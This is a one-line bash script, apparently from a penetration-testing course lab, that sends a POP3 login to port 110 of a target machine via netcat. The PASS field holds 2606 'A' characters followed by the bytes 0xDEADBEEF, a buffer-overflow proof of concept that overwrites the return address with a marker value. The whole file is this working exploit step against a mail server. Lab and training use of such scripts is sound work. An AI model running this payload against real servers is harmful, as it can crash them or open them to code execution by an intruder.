#!/bin/bash

python2 -c "import sys;sys.stdout.write('USER test\r\nPASS ' + 'A'*2606 + '\xef\xbe\xad\xde'+'\r\n')" | nc -nv $WIN7_offsec_machine_ip 110
